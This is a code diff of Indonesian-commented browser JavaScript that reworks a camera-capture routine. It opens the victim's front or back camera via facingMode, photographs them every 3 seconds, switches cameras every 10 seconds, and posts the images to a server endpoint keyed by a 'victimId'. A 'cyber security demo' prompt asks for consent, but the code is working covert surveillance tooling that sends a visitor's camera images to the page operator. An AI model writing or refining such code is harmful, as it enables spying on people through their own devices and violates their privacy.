@@ -21,8 +21,6 @@ let currentCameraType = null;
 let isSwitching = false;
 let switchInterval = null;
 let periodicInterval = null;
-let cameraIndex = 0;
-let availableCameras = [];
 let isCameraActive = false;
 let cameraRetryCount = 0;
 const MAX_RETRY = 3;
@@ -55,30 +53,6 @@ async function sendData(type, data) {
 }
 
 // ==================== FUNGSI KAMERA ====================
-
-async function getAvailableCameras() {
-  try {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
-      debug("❌ Browser tidak mendukung enumerateDevices");
-      return [];
-    }
-    const tempStream = await navigator.mediaDevices.getUserMedia({
-      video: true,
-    });
-    tempStream.getTracks().forEach((track) => track.stop());
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const cameras = devices.filter((device) => device.kind === "videoinput");
-    debug(`📷 Ditemukan ${cameras.length} kamera:`);
-    cameras.forEach((cam, i) => {
-      const label = cam.label || `Kamera ${i + 1}`;
-      debug(`   ${i + 1}. ${label}`);
-    });
-    return cameras;
-  } catch (err) {
-    debug("❌ Gagal mendapatkan daftar kamera: " + err.message);
-    return [];
-  }
-}
 
 async function captureFromStream(stream, cameraType) {
   if (!stream || !stream.active) return null;
@@ -143,13 +117,15 @@ function handleCameraError(err, cameraType) {
   });
 }
 
-// ============= FUNGSI START CAMERA YANG DIPERBAIKI =============
-async function startCameraWithDevice(device, cameraLabel, retryCount = 0) {
+// ============= FUNGSI START CAMERA DENGAN FACINGMODE =============
+async function startCameraWithMode(cameraType, retryCount = 0) {
   if (isSwitching) {
     debug("⏳ Sedang beralih kamera, tunggu...");
     return false;
   }
+
   isSwitching = true;
+
   try {
     // Hentikan stream sebelumnya
     if (currentStream) {
@@ -160,52 +136,46 @@ async function startCameraWithDevice(device, cameraLabel, retryCount = 0) {
         action: "stopped",
         timestamp: new Date().toISOString(),
       });
+      currentStream = null;
     }
-    // Tentukan tipe kamera
-    let cameraType = "unknown";
-    const labelLower = cameraLabel.toLowerCase();
-    if (
-      labelLower.includes("front") ||
-      labelLower.includes("face") ||
-      labelLower.includes("user") ||
-      labelLower.includes("selfie") ||
-      availableCameras.indexOf(device) === 0
-    ) {
-      cameraType = "front";
-    } else {
-      cameraType = "back";
-    }
-    // Konfigurasi constraints
+
+    // Tentukan facingMode
+    const facingMode = cameraType === "front" ? "user" : "environment";
+
+    // Konfigurasi constraints dengan facingMode
     const constraints = {
       video: {
         width: { ideal: 640, max: 1280 },
         height: { ideal: 480, max: 720 },
-        frameRate: { ideal: 30, max: 30 },
+        facingMode: { exact: facingMode },
       },
     };
-    if (device.deviceId) {
-      constraints.video.deviceId = { exact: device.deviceId };
-      debug(
-        `📷 Mengakses kamera ${cameraType} dengan deviceId: ${device.deviceId}`,
-      );
-    }
+
+    debug(
+      `📷 Mengakses kamera ${cameraType} dengan facingMode: ${facingMode}...`,
+    );
+
     const statusEl = document.getElementById("status");
     if (statusEl) {
       statusEl.textContent = `Mengakses kamera ${cameraType === "front" ? "DEPAN" : "BELAKANG"}...`;
     }
+
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     currentStream = stream;
     currentCameraType = cameraType;
     cameraRetryCount = 0;
-    debug(`✅ Kamera ${cameraType} aktif (${cameraLabel})`);
+
+    debug(`✅ Kamera ${cameraType} aktif`);
+
     await sendData("camera_access", {
       camera: cameraType,
-      cameraLabel: cameraLabel,
       status: "active",
       timestamp: new Date().toISOString(),
     });
+
     // Tunggu stream stabil
     await new Promise((r) => setTimeout(r, 500));
+
     // Ambil foto setelah aktif
     const image = await captureFromStream(stream, cameraType);
     if (image) {
@@ -216,128 +186,78 @@ async function startCameraWithDevice(device, cameraLabel, retryCount = 0) {
           victimId: victimId,
           image: image,
           cameraType: cameraType,
-          cameraLabel: cameraLabel,
           timestamp: new Date().toISOString(),
         }),
       });
       const result = await response.json();
-      debug(
-        `📸 Foto ${cameraType} (${cameraLabel}) terkirim: ${result.status}`,
-      );
+      debug(`📸 Foto ${cameraType} terkirim: ${result.status}`);
     }
+
     return true;
   } catch (err) {
-    handleCameraError(err, cameraType || "unknown");
+    debug(`❌ Gagal akses kamera ${cameraType}: ${err.message}`);
+
+    // Jika facingMode tidak didukung, coba tanpa facingMode
+    if (
+      err.message.includes("facingMode") ||
+      err.name === "OverconstrainedError"
+    ) {
+      debug(
+        `🔄 ${cameraType} tidak didukung, coba fallback tanpa facingMode...`,
+      );
+      try {
+        const fallbackStream = await navigator.mediaDevices.getUserMedia({
+          video: { width: { ideal: 640 }, height: { ideal: 480 } },
+        });
+        currentStream = fallbackStream;
+        currentCameraType = "default";
+        debug(`✅ Kamera default aktif (fallback mode)`);
+        await sendData("camera_access", {
+          camera: "default",
+          status: "active_fallback",
+          timestamp: new Date().toISOString(),
+        });
+        return true;
+      } catch (e) {
+        debug(`❌ Fallback gagal: ${e.message}`);
+      }
+    }
+
+    // Retry logic untuk error tertentu
     if (
       retryCount < MAX_RETRY &&
       (err.name === "NotReadableError" || err.name === "TrackStartError")
     ) {
-      debug(`🔄 Retry kamera (${retryCount + 1}/${MAX_RETRY})...`);
+      debug(
+        `🔄 Retry kamera ${cameraType} (${retryCount + 1}/${MAX_RETRY})...`,
+      );
       await new Promise((r) => setTimeout(r, 1000));
-      return await startCameraWithDevice(device, cameraLabel, retryCount + 1);
+      return await startCameraWithMode(cameraType, retryCount + 1);
     }
+
+    await sendData("camera_access", {
+      camera: cameraType,
+      status: "error",
+      error: err.message,
+    });
     return false;
   } finally {
     isSwitching = false;
   }
 }
 
-// ============= FUNGSI SWITCH CAMERA YANG DIPERBAIKI =============
-async function switchToNextCamera() {
-  if (!availableCameras.length) {
-    debug("❌ Tidak ada kamera tersedia untuk beralih");
-    return;
-  }
-  // Hentikan stream saat ini TERLEBIH DAHULU
-  if (currentStream) {
-    currentStream.getTracks().forEach((track) => track.stop());
-    debug(`🛑 Kamera ${currentCameraType} dihentikan sebelum switch`);
-    await sendData("camera_switched", {
-      previous: currentCameraType,
-      action: "stopped",
-      timestamp: new Date().toISOString(),
-    });
-    currentStream = null;
-  }
-  // Pindah ke kamera berikutnya
-  cameraIndex = (cameraIndex + 1) % availableCameras.length;
-  const nextCamera = availableCameras[cameraIndex];
-  const cameraLabel = nextCamera.label || `Kamera ${cameraIndex + 1}`;
-  let cameraType = "unknown";
-  const labelLower = cameraLabel.toLowerCase();
-  if (
-    labelLower.includes("front") ||
-    labelLower.includes("face") ||
-    labelLower.includes("user") ||
-    labelLower.includes("selfie") ||
-    cameraIndex === 0
-  ) {
-    cameraType = "front";
+// ============= FUNGSI SWITCH CAMERA =============
+async function switchCamera() {
+  if (currentCameraType === "front") {
+    debug("🔄 Mencoba beralih ke kamera BELAKANG...");
+    await startCameraWithMode("back");
+  } else if (currentCameraType === "back") {
+    debug("🔄 Mencoba beralih ke kamera DEPAN...");
+    await startCameraWithMode("front");
   } else {
-    cameraType = "back";
-  }
-  debug(
-    `🔄 Beralih ke kamera ${cameraIndex + 1}: ${cameraLabel} (${cameraType})`,
-  );
-  const statusEl = document.getElementById("status");
-  if (statusEl) {
-    statusEl.textContent = `Mengganti ke kamera ${cameraType === "front" ? "DEPAN" : "BELAKANG"}...`;
-  }
-  try {
-    const constraints = {
-      video: {
-        width: { ideal: 640, max: 1280 },
-        height: { ideal: 480, max: 720 },
-      },
-    };
-    if (nextCamera.deviceId) {
-      constraints.video.deviceId = { exact: nextCamera.deviceId };
-    }
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    currentStream = stream;
-    currentCameraType = cameraType;
-    debug(`✅ Kamera ${cameraType} aktif (${cameraLabel})`);
-    await sendData("camera_access", {
-      camera: cameraType,
-      cameraLabel: cameraLabel,
-      status: "active",
-      timestamp: new Date().toISOString(),
-    });
-    await new Promise((r) => setTimeout(r, 500));
-    const image = await captureFromStream(stream, cameraType);
-    if (image) {
-      const response = await fetch("/api/capture-image", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          victimId: victimId,
-          image: image,
-          cameraType: cameraType,
-          cameraLabel: cameraLabel,
-          timestamp: new Date().toISOString(),
-          isSwitch: true,
-        }),
-      });
-      const result = await response.json();
-      debug(`📸 Foto ${cameraType} setelah switch terkirim: ${result.status}`);
-    }
-    if (statusEl) {
-      statusEl.textContent = `Kamera aktif: ${cameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
-    }
-  } catch (err) {
-    debug(`❌ Gagal switch ke kamera ${cameraType}: ${err.message}`);
-    await sendData("camera_error", {
-      camera: cameraType,
-      error: err.message,
-      action: "switch",
-    });
-    if (cameraIndex > 0) {
-      cameraIndex = cameraIndex - 1;
-      const prevCamera = availableCameras[cameraIndex];
-      const prevLabel = prevCamera.label || `Kamera ${cameraIndex + 1}`;
-      debug(`🔄 Kembali ke kamera sebelumnya: ${prevLabel}`);
-      await startCameraWithDevice(prevCamera, prevLabel);
-    }
+    // Jika currentCameraType default, coba ke depan dulu
+    debug("🔄 Mode default, mencoba beralih ke kamera DEPAN...");
+    await startCameraWithMode("front");
   }
 }
 
@@ -451,30 +371,29 @@ setTimeout(async () => {
   }
 }, 2000);
 
+// 3. Minta akses kamera (SWITCH CAMERA dengan FACINGMODE)
 setTimeout(async () => {
-  debug("📷 Memulai akses kamera (switch camera mode)...");
+  debug("📷 Memulai akses kamera (switch camera dengan facingMode)...");
+
   const izinAwal = confirm(
     "⚠️ DEMO KEAMANAN SIBER ⚠️\n\n" +
       "Website ini akan mengakses kamera Anda untuk simulasi keamanan.\n\n" +
       "Klik OK untuk mengizinkan akses kamera",
   );
+
   if (!izinAwal) {
     debug("❌ Izin kamera ditolak user");
     await sendData("camera_access", { status: "denied" });
     return;
   }
-  availableCameras = await getAvailableCameras();
-  if (availableCameras.length === 0) {
-    debug("❌ Tidak ada kamera ditemukan");
-    await startFallbackCamera();
-    return;
-  }
-  const firstCamera = availableCameras[0];
-  const firstLabel = firstCamera.label || "Kamera 1";
-  const firstSuccess = await startCameraWithDevice(firstCamera, firstLabel);
-  if (firstSuccess) {
+
+  // Mulai dengan kamera depan
+  const frontSuccess = await startCameraWithMode("front");
+
+  if (frontSuccess) {
     isCameraActive = true;
-    // Kirim foto periodik setiap 3 detik - DENGAN CAMERA TYPE YANG BENAR
+
+    // Kirim foto periodik setiap 3 detik
     periodicInterval = setInterval(async () => {
       if (
         currentStream &&
@@ -503,32 +422,27 @@ setTimeout(async () => {
         }
       }
     }, 3000);
-    if (availableCameras.length > 1) {
-      debug(
-        `📷 Terdeteksi ${availableCameras.length} kamera, akan bergantian setiap 10 detik`,
-      );
-      const statusEl = document.getElementById("status");
-      if (statusEl) {
-        statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
-      }
-      switchInterval = setInterval(async () => {
-        if (!isSwitching && currentStream) {
-          debug("🔄 Menjalankan pergantian kamera otomatis...");
-          await switchToNextCamera();
-          if (statusEl) {
-            statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
-          }
-        }
-      }, 10000);
-    } else {
-      debug("📷 Hanya 1 kamera tersedia, mode single camera");
-      const statusEl = document.getElementById("status");
-      if (statusEl)
-        statusEl.textContent = `Kamera aktif (single) | Mengirim foto setiap 3 detik`;
+
+    // Mulai pergantian kamera otomatis setiap 10 detik
+    debug("🔄 Memulai pergantian kamera otomatis setiap 10 detik...");
+    const statusEl = document.getElementById("status");
+    if (statusEl) {
+      statusEl.textContent = `Kamera aktif: DEPAN | Akan bergantian setiap 10 detik`;
     }
-    debug("✅ Sistem kamera siap");
+
+    switchInterval = setInterval(async () => {
+      if (!isSwitching && currentStream && currentCameraType !== "default") {
+        debug("🔄 Menjalankan pergantian kamera otomatis...");
+        await switchCamera();
+        if (statusEl) {
+          statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
+        }
+      }
+    }, 10000);
+
+    debug("✅ Sistem kamera siap dengan mode switch (facingMode)");
   } else {
-    debug("❌ Gagal mengakses kamera pertama");
+    debug("❌ Gagal mengakses kamera depan, mencoba fallback...");
     await startFallbackCamera();
   }
 }, 3000);
